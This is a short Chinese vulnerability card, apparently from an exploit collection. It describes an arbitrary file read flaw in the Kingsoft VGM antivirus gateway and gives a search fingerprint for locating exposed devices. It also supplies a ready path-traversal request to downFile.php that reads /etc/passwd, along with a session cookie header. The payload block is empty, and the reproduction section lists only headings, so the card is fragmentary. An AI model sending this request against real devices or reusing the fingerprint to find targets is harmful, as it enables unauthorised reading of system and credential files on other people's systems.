# 金山VGM防毒墙downFile存在任意文件读取漏洞

- **系统**：金山VGM防毒墙　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`"金山VGM"`
- **请求**：`GET /downFile.php?filename=../../../../etc/passwd HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=74hpcfh7p42bll8eabp1v88eq3`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```

```

**其他**
- 金山 VGM防毒墙downFile存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金山 VGM防毒墙